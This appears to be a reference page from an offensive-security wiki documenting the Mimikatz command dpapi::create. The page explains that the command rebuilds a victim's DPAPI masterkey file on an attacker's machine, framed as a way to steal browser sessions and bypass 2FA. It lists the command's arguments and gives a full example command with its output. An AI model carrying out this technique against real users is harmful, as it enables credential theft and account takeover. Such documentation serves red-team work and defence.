# create

`dpapi::create` creates a DPAPI Masterkey file from raw key and metadata. It comes in handy when you want to decrypt a victim's DPAPI secrets locally in your machine. CoreSecurity has published a [guide](https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz) on how you can clone the Google Chrome Victim's session and decrypt it from your own box. Benjamin has also [tweeted](https://twitter.com/gentilkiwi/status/1236634610529959936?s=20) how you can recreate masterkeys on your own machine to steal browser sessions and bypass 2FA. It has the following command line arguments:

* `/sid`: the Security Identifier of the target user
* `/md4`: the MD4 key
* `/key`: The masterkey. It can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi)``
* `/sha1`: the SHA1 key. It can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi)``
* `/hash`: the SHA1 hash of YOUR password when porting the victim's DPAPI files to your system
* `/dpapi`: TODO
* `/guid`: the user's GUID. it can be obtained through [`sekurlsa::dpapi`](https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi). it is also the _**szGuid**_ output value of the `dpapi::masterkey in:"C:\Users<UserName>\AppData\Roaming\Microsoft\Protect\SID\MasterKey_ID" /rpc`
* `/system`: the DPAPI\_SYSTEM key. It can be found through [`lsadump::secrets`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/secrets)
* `/password`: This is YOUR password when porting the victim's DPAPI files to your system
* `/protected`: it defines the user account as a protected one

```
mimikatz # dpapi::create /guid:{5c22983f-77ee-41e4-9086-8073d664e417} /key:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3 /password:Super_SecretPass /protected
Target SID is: S-1-5-21-2725560159-1428537199-2260736313-1730

[masterkey] with password: Super_SecretPass (protected user)
Key GUID: {5c22983f-77ee-41e4-9086-8073d664e417}
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {5c22983f-77ee-41e4-9086-8073d664e417}
  dwFlags            : 00000000 - 0
  dwMasterKeyLen     : 00000108 - 264
  dwBackupKeyLen     : 00000000 - 0
  dwCredHistLen      : 00000000 - 0
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 5c765e71ed00a886cb27b5ab5ea2ff19
    rounds           : 00000fa0 - 4000
    algHash          : 00008009 - 32777 (CALG_HMAC)
    algCrypt         : 00006603 - 26115 (CALG_3DES)
    pbKey            : 2a10ef754addc9bfcea06565e1a8fe388e4bdca26bca4c85ba2420bdfccacc343dff4ea9021ad55b6ea2f1bcfcbe95fe2f0ad6eece14e3a5797aa0957b09601f42d87ec03885cc82b2c208160e182518c9840df006d0f312d6cde65854ef8b0da26f252f7f0ad9f2


File '5c22983f-77ee-41e4-9086-8073d664e417' (hidden & system): OK
```
